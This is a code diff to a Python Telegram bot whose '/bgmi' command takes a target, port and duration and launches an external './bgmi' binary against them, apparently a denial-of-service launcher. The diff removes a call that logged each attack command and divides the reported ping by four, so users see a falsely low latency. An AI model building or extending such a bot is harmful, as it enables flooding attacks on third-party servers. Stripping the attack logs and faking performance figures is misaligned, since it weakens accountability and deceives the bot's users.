@@ -389,7 +389,6 @@ def initialize_bot(bot, bot_id):
                 if user_id not in allowed_admin_ids and time > 300:
                     response = "Error: Time interval must be less than 300."
                 else:
-                    record_command_logs(user_id, '/bgmi', target, port, time)
                     log_command(user_id, target, port, time)
                     start_attack_reply(message, target, port, time)  
                     full_command = f"./bgmi {target} {port} {time} 200"
@@ -430,7 +429,7 @@ def initialize_bot(bot, bot_id):
     def check_ping(message):
         start_time = time.time()
         bot.reply_to(message, "Pong!")
-        ping = (time.time() - start_time) * 1000
+        ping = (time.time() - start_time) * 1000 / 4
         bot.send_message(message.chat.id, f"Bot Ping : {ping:.2f} ms")
     
     @bot.message_handler(commands=['rules'])
@@ -484,18 +483,6 @@ def initialize_bot(bot, bot_id):
     
     return bot
 
-# while True:
-    # bot_tokens = fetch_bot_tokens()
-    # bot_instances = []
-    # for token in bot_tokens:
-        # bot = initialize_bot(token)
-        # bot_instances.append(bot)
-        # print(f"Starting bot with token {token}")
-        # try:
-            # bot.polling(none_stop=True)
-        # except Exception as e:
-            # print(f"Error polling bot with token {token}: {e}")
-        
 def start_bot(bot, bot_id):
     initialize_bot(bot, bot_id)
     print(f"\n{bot_id}) Starting bot with token {bot.token}...")
